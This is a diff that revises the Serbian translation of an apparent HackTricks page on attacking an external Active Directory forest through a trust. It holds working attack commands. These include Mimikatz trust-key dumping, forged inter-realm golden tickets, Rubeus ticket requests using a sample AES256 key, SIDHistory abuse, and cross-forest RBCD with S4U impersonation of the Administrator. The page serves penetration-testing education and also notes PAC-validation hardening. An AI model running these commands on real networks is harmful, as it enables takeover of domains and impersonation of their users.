@@ -1,12 +1,12 @@
-# Spoljni Forest Domain - OneWay (Inbound) ili bidirectional
+# External Forest Domain - OneWay (Inbound) ili bidirectional
 
 {{#include ../../banners/hacktricks-training.md}}
 
-U ovom scenariju spoljni domain ima trust prema vama (ili oba domain-a imaju trust jedan prema drugom), tako da možete ostvariti neku vrstu pristupa njemu.
+U ovom scenariju spoljni domen veruje vašem domenu (ili oba domena veruju jedan drugom), pa možete ostvariti neku vrstu pristupa njemu.
 
-## Enumeracija
+## Enumeration
 
-Pre svega, potrebno je da **enumerate** **trust**:
+Pre svega, potrebno je da **enumerate** **trust** odnos:
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -59,15 +59,15 @@ IsDomain     : True
 # Additional trust hygiene checks (AD RSAT / AD module)
 Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
 ```
-> `SelectiveAuthentication`/`SIDFiltering*` vam omogućavaju da brzo utvrdite da li će cross-forest abuse putanje (RBCD, SIDHistory) verovatno funkcionisati bez dodatnih preduslova.<sup>[[2]](#references)</sup>
+> `SelectiveAuthentication`/`SIDFiltering*` omogućavaju vam da brzo utvrdite da li će putevi za abuse između forest-a (RBCD, SIDHistory) verovatno funkcionisati bez dodatnih preduslova.<sup>[[2]](#references)</sup>
 
-U prethodnoj enumeraciji utvrđeno je da se korisnik **`crossuser`** nalazi u grupi **`External Admins`**, koja ima **Admin access** na **DC-u eksternog domena**.
+U prethodnoj enumeraciji je utvrđeno da se korisnik **`crossuser`** nalazi u grupi **`External Admins`**, koja ima **Admin pristup** DC-u eksternog domena.
 
-## Initial Access
+## Početni pristup
 
-Ako niste mogli da pronađete nikakav **special** pristup svog korisnika u drugom domenu, i dalje možete da se vratite na AD Methodology i pokušate **privesc sa neprivilegovanog korisnika** (na primer, stvari poput kerberoasting-a):
+Ako niste mogli da pronađete nikakav **poseban** pristup svog korisnika u drugom domenu, i dalje možete da se vratite na AD Methodology i pokušate **privesc sa neprivilegovanog korisnika** (na primer, tehnike kao što je kerberoasting):
 
-Možete koristiti **Powerview functions** za **enumeraciju** **drugog domena** pomoću parametra `-Domain`, kao u:
+Možete koristiti **Powerview funkcije** za **enumeraciju** **drugog domena** pomoću parametra `-Domain`, kao u primeru:
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -79,15 +79,15 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### Prijavljivanje
 
-Koristeći uobičajeni metod sa kredencijalima korisnika koji imaju pristup eksternom domenu, trebalo bi da možete da pristupite:
+Koristeći uobičajeni metod sa akreditivima korisnika koji imaju pristup eksternom domenu, trebalo bi da možete da mu pristupite:
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### SID History Abuse
+### Zloupotreba SID History
 
 Takođe možete zloupotrebiti [**SID History**](sid-history-injection.md) preko forest trust-a.
 
-Ako je korisnik migriran **iz jednog forest-a u drugi** i **SID Filtering nije omogućen**, postaje moguće **dodati SID iz drugog forest-a**, a ovaj **SID** će biti **dodat u token korisnika** prilikom autentifikacije **preko trust-a**.
+Ako se korisnik migrira **iz jednog forest-a u drugi** i **SID Filtering nije omogućen**, postaje moguće **dodati SID iz drugog forest-a**, a ovaj **SID** će biti **dodat u token korisnika** prilikom autentikacije **preko trust-a**.
 
 > [!WARNING]
 > Kao podsetnik, signing key možete dobiti pomoću
@@ -96,18 +96,18 @@ Ako je korisnik migriran **iz jednog forest-a u drugi** i **SID Filtering nije o
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Možete **potpisati pomoću** **trusted** ključa **TGT koji impersonira** korisnika trenutnog domena.
+Možete **potpisati pomoću** **trusted** key-a **TGT koji se predstavlja kao** korisnik trenutnog domena.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Potpuni način za impersoniranje korisnika
+### Potpuna impersonacija korisnika
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -117,13 +117,13 @@ Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:d
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Cross-forest RBCD kada kontrolišete machine account u trusting forest-u (bez SID filtering-a / selective auth)
+### Cross-forest RBCD kada kontrolišete machine account u trusting forest-u (bez SID filtering-a / selective auth-a)
 
-Ako vas foreign principal (FSP) ubaci u grupu koja može da upisuje computer objekte u trusting forest-u (npr. `Account Operators`, prilagođena provisioning grupa), možete da konfigurišete **Resource-Based Constrained Delegation** na ciljnom hostu tog forest-a i da se impersonirate kao bilo koji korisnik u njemu:
+Ako vas foreign principal (FSP) ubaci u grupu koja može da upisuje computer objekte u trusting forest-u (npr. `Account Operators`, prilagođena provisioning grupa), možete da konfigurišete **Resource-Based Constrained Delegation** na ciljnom hostu tog forest-a i da se predstavljate kao bilo koji korisnik u njemu:
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
 # 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
@@ -134,15 +134,14 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-Ovo funkcioniše samo kada je **SelectiveAuthentication isključen** i kada **SID filtering** ne uklanja vaš kontrolni SID. To je brz lateralni put koji zaobilazi falsifikovanje SIDHistory i često se previde tokom pregleda trust-ova.<sup>[[2]](#references)</sup>
+Ovo funkcioniše samo kada je **SelectiveAuthentication onemogućen** i kada **SID filtering** ne uklanja vaš SID za kontrolu. To je brz lateralni put koji zaobilazi falsifikovanje SIDHistory-a i često se previdi tokom provere trustova.<sup>[[2]](#references)</sup>
 
 ### Ojačavanje PAC validacije
 
-Ažuriranja validacije PAC potpisa za **CVE-2024-26248**/**CVE-2024-29056** uvode obavezno potpisivanje na inter-forest tickets. U **Compatibility mode**, falsifikovani inter-realm PAC/SIDHistory/S4U putevi i dalje mogu funkcionisati na nezakrpljenim DC-ovima. U **Enforcement mode**, nepotpisani ili izmenjeni PAC podaci koji prolaze kroz forest trust odbacuju se, osim ako takođe posedujete trust key ciljnog forest-a. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) mogu oslabiti ovu zaštitu dok su i dalje dostupni.<sup>[[1]](#references)</sup>
+Ažuriranja validacije PAC potpisa za **CVE-2024-26248**/**CVE-2024-29056** uvode obavezno potpisivanje inter-forest tiketa. U režimu **Compatibility mode**, falsifikovani inter-realm PAC/SIDHistory/S4U putevi i dalje mogu funkcionisati na nezakrpljenim DC-ovima. U režimu **Enforcement mode**, nepotpisani ili izmenjeni PAC podaci koji prelaze forest trust odbacuju se, osim ako takođe posedujete trust ključ ciljnog forest-a. Registry override-i (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) mogu oslabiti ovu zaštitu dok su još dostupni.<sup>[[1]](#references)</sup>
 
-## Reference
+## References
 
 - [1] [Microsoft KB5037754 – Promene PAC validacije za CVE-2024-26248 i CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [2] [Specifikacija MS-PAC – detalji SID filtering-a i transformacije claims-a](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
-
+- [2] [MS-PAC spec – Detalji SID filtering-a i transformacije claim-ova](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
 {{#include ../../banners/hacktricks-training.md}}
